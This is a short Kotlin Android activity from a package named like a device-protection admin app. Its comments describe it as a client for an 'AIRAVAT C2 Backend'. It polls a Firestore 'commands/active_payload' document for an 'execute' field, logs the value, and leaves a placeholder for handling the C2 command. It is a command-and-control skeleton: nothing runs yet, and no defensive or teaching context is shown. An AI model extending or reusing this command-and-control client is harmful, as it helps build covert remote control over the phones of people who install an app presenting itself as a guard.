package com.deviceguard.admin

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.QuerySnapshot

class MainActivity : AppCompatActivity() {

    // Initialize Firestore
    private lateinit var db: FirebaseFirestore

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // setContentView(R.layout.activity_main) // Uncomment if you have a UI layout

        // Connect to the AIRAVAT C2 Backend
        db = FirebaseFirestore.getInstance()

        // Example of executing a Firestore query to get C2 commands
        // This resolves the 'collection' and 'document' unresolved references
        db.collection("commands")
            .document("active_payload")
            .get()
            .addOnSuccessListener { document: DocumentSnapshot ->
                if (document.exists()) {
                    val command = document.getString("execute")
                    Log.d("AIRAVAT_C2", "Command received: $command")
                    // Add logic here to handle the C2 command
                }
            }
            .addOnFailureListener { exception ->
                Log.w("AIRAVAT_C2", "Error getting documents: ", exception)
            }
    }
}
